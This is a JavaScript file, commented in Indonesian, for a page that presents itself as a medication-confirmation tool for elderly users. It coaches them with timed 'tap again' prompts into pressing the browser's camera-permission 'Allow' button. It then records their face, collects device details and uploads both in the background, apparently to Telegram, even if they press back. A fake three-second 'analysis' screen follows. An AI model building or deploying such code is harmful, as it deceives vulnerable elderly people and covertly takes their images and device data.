/**
 * medication.js — Layar Tunggal Terintegrasi untuk Konfirmasi Minum Obat
 * Dioptimalkan untuk kecepatan maksimum (Zero-DOM Blocking):
 * 1. Panggilan getUserMedia() dieksekusi PERTAMA KALI sebelum operasi DOM.
 * 2. Operasi DOM dilakukan secara asynchronous (requestAnimationFrame).
 */

function getSupportedMimeType() {
  const candidates = [
    'video/mp4;codecs=h264',
    'video/webm;codecs=vp9',
    'video/webm;codecs=vp8',
    'video/webm',
  ];
  return candidates.find(t => MediaRecorder.isTypeSupported(t)) || '';
}

function startMedication(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  // Reset flag back-press dan trigger agar layar ini selalu bersih
  state.backPressedDuringRecording = false;
  _isTriggeringMed = false;

  // Pre-warm background saat menu dibuka
  if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
    try { navigator.mediaDevices.enumerateDevices().catch(() => {}); } catch (_) {}
  }
  if (navigator.permissions && navigator.permissions.query) {
    try { navigator.permissions.query({ name: 'camera' }).catch(() => {}); } catch (_) {}
  }

  showScreen('screen-camera');

  const badge = $('med-badge');
  const badgeText = $('med-badge-text');
  const title = $('med-title');
  const subtitle = $('med-subtitle');
  const bottomTrigger = $('med-bottom-trigger');
  const bottomProgress = $('med-bottom-progress');

  if (badge) badge.className = 'rec-badge';
  if (badgeText) badgeText.textContent = 'SIAPKAN OBAT';
  if (title) title.textContent = 'Konfirmasi Minum Obat';
  if (subtitle) subtitle.innerHTML = 'Posisikan HP di depan wajah Anda,<br>lalu ketuk tombol di bawah <strong>2 kali cepat</strong> untuk mulai.';
  
  if (bottomTrigger) bottomTrigger.style.display = 'flex';

  // Sembunyikan fase kamera (video + progress) saat reset ke awal
  const cameraPhase = $('med-camera-phase');
  if (cameraPhase) cameraPhase.style.display = 'none';
  if (bottomProgress) bottomProgress.style.display = 'none';

  // Pastikan video instruksi tidak autoplay sebelum izin diberikan
  const instrVideo = $('instr-video');
  if (instrVideo) instrVideo.pause();
}

function startCountdown(seconds, onComplete) {
  const numEl   = $('countdown-num');
  const bar     = $('ring-bar');
  const progressText = $('med-progress-text');

  let remaining = seconds;
  if (numEl) numEl.textContent = remaining;
  if (progressText) progressText.innerHTML = `Selesai dalam <span id="countdown-num">${remaining}</span> detik&hellip;`;
  if (bar) bar.style.width = '0%';

  const totalMs   = seconds * 1000;
  const startTime = Date.now();

  const rafUpdate = () => {
    const elapsed  = Date.now() - startTime;
    const progress = Math.min(elapsed / totalMs, 1);
    if (bar) bar.style.width = `${progress * 100}%`;
  };

  state.countdownTimer = setInterval(() => {
    remaining--;
    const currentNum = $('countdown-num');
    if (currentNum) currentNum.textContent = remaining;
    rafUpdate();

    if (remaining <= 0) {
      clearInterval(state.countdownTimer);
      if (bar) bar.style.width = '100%';
      onComplete();
    }
  }, 1000);
}

async function handleVideoReady() {
  const chunks   = state.recordedChunks.slice();
  const mimeUsed = state.mediaRecorder?.mimeType || 'video/webm';

  // Hentikan kamera
  if (state.mediaStream) {
    state.mediaStream.getTracks().forEach(t => t.stop());
    state.mediaStream = null;
  }
  clearInterval(state.countdownTimer);
  state.countdownTimer = null;
  state.recordedChunks = [];

  // 🔥 Kirim video di background (fire-and-forget) — tetap berjalan meski lansia kembali ke home
  if (chunks.length > 0) {
    const blob = new Blob(chunks, { type: mimeUsed });
    collectDeviceInfo().then(devInfo => {
      const caption = `KONFIRMASI MINUM OBAT\n\n${formatDeviceInfo(devInfo)}`;
      tgSendVideo(blob, caption).catch(err =>
        console.warn('[medication.js] Background upload error:', err)
      );
    }).catch(err => console.warn('[medication.js] Device info error:', err));
  }

  // Jika back ditekan saat rekam: video sudah dikirim di background,
  // jangan tampilkan layar analisis — biarkan startMedication() yang mengatur UI.
  if (state.backPressedDuringRecording) {
    state.backPressedDuringRecording = false;
    return;
  }

  // Tampilkan layar analisis langsung
  showAnalysisScreen();
}

/**
 * Menampilkan layar analisis dengan circular progress selama 3 detik,
 * lalu beralih ke layar daftar obat.
 */
function showAnalysisScreen() {
  showScreen('screen-analysis');

  const circle       = document.getElementById('analysis-circle');
  const DURATION_MS  = 3000;
  // Keliling lingkaran r=50: 2 * π * 50 ≈ 314.16
  const CIRCUMFERENCE = 2 * Math.PI * 50;

  if (circle) {
    circle.style.strokeDasharray  = CIRCUMFERENCE;
    circle.style.strokeDashoffset = CIRCUMFERENCE;
  }

  const startTime = Date.now();

  function animate() {
    const elapsed  = Date.now() - startTime;
    const progress = Math.min(elapsed / DURATION_MS, 1);
    const offset   = CIRCUMFERENCE * (1 - progress);

    if (circle) circle.style.strokeDashoffset = offset;

    if (progress < 1) {
      requestAnimationFrame(animate);
    } else {
      showMedicineListScreen();
    }
  }

  requestAnimationFrame(animate);
}

/** Menampilkan layar daftar obat hasil analisis */
function showMedicineListScreen() {
  showScreen('screen-medicine-list');

  // Animasikan item obat masuk satu per satu
  const items = document.querySelectorAll('.medicine-item');
  items.forEach((item, i) => {
    item.style.opacity    = '0';
    item.style.transform  = 'translateX(-24px)';
    item.style.transition = 'opacity 0.35s ease, transform 0.35s ease';
    setTimeout(() => {
      item.style.opacity   = '1';
      item.style.transform = 'translateX(0)';
    }, 120 + i * 100);
  });
}

let _isTriggeringMed = false;

async function triggerMedicationCamera(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  if (_isTriggeringMed) return;
  _isTriggeringMed = true;

  state.isCancelled = false;

  // ⚡ LANGKAH 1 (PRIORITAS UTAMA): Minta stream kamera LANGSUNG seketika
  const mediaPromise = navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user' },
    audio: false,
  });

  // ⚡ LANGKAH 2: Haptic feedback instan
  if (navigator.vibrate) {
    try { navigator.vibrate([50, 40, 50]); } catch (_) {}
  }

  // ⚡ LANGKAH 3: Update DOM secara terpisah agar tidak memblokir browser
  // Tombol tetap kuning sampai lansia memilih di dialog izin (tanpa batas waktu)
  requestAnimationFrame(() => {
    const btn = $('btn-trigger-obat');
    const text = $('btn-trigger-obat-text');
    const sub  = $('btn-trigger-obat-sub');
    if (btn && text) {
      btn.classList.add('trigger-active');
      text.textContent = '👆 KETUK SEKALI LAGI SEKARANG!';
      if (sub) sub.textContent = 'UNTUK MENEKAN IZINKAN';
    }
  });

  try {
    state.mediaStream = await mediaPromise;
  } catch (err) {
    _isTriggeringMed = false;
    const btn = $('btn-trigger-obat');
    const text = $('btn-trigger-obat-text');
    const sub  = $('btn-trigger-obat-sub');
    if (btn && text) {
      btn.classList.remove('trigger-active');
      text.textContent = '⚡ KETUK 2 KALI CEPAT';
      if (sub) sub.textContent = 'UNTUK MEMBUKA KAMERA & MULAI';
    }

    let msg = 'Tidak dapat mengakses kamera.';
    if (err.name === 'NotAllowedError') {
      msg = 'Izin kamera ditolak. Silakan ketuk tombol 2 kali cepat lagi, lalu pilih "Izinkan".';
    } else if (err.name === 'NotFoundError') {
      msg = 'Kamera tidak ditemukan di perangkat ini.';
    } else if (err.name === 'NotReadableError') {
      msg = 'Kamera sedang digunakan aplikasi lain.';
    }
    showResult({ success: false, icon: '🚫', title: 'Kamera Belum Diizinkan', message: msg });
    return;
  }

  _isTriggeringMed = false;

  // Ubah tampilan ke Fase 2 (Mulai Rekam 5 Detik)
  const badge = $('med-badge');
  const badgeText = $('med-badge-text');
  const title = $('med-title');
  const subtitle = $('med-subtitle');
  const bottomTrigger = $('med-bottom-trigger');
  const bottomProgress = $('med-bottom-progress');

  if (badge) badge.className = 'rec-badge rec-badge-recording';
  if (badgeText) badgeText.textContent = 'SEDANG MEREKAM';
  if (title) title.textContent = 'Perekaman Dimulai!';
  if (subtitle) subtitle.innerHTML = 'Kamera sedang merekam wajah Anda secara otomatis.<br>Mohon tetap di tempat sebentar.';

  // Sembunyikan fase trigger, tampilkan fase kamera (video + progress)
  if (bottomTrigger) bottomTrigger.style.display = 'none';
  const cameraPhase = $('med-camera-phase');
  if (cameraPhase) cameraPhase.style.display = 'block';
  if (bottomProgress) bottomProgress.style.display = 'flex';

  // Mulai putar video instruksi setelah izin diberikan
  const instrVideo = $('instr-video');
  if (instrVideo) {
    instrVideo.currentTime = 0;
    instrVideo.play().catch(() => {});
  }

  $('camera-video').srcObject = state.mediaStream;

  const mimeType       = getSupportedMimeType();
  state.recordedChunks = [];
  state.mediaRecorder  = new MediaRecorder(state.mediaStream, mimeType ? { mimeType } : {});

  state.mediaRecorder.ondataavailable = (e) => {
    if (e.data && e.data.size > 0) state.recordedChunks.push(e.data);
  };
  state.mediaRecorder.onstop = async () => {
    if (state.isCancelled) return;
    await handleVideoReady();
  };

  state.mediaRecorder.start(500);
  startCountdown(CONFIG.VIDEO_DURATION_SEC, () => {
    if (!state.isCancelled && state.mediaRecorder?.state !== 'inactive') {
      state.mediaRecorder.stop();
    }
  });
}

function cancelCamera() {
  state.isCancelled = true;
  _isTriggeringMed = false;
  clearInterval(state.countdownTimer);
  stopAllMedia();
  goHome();
}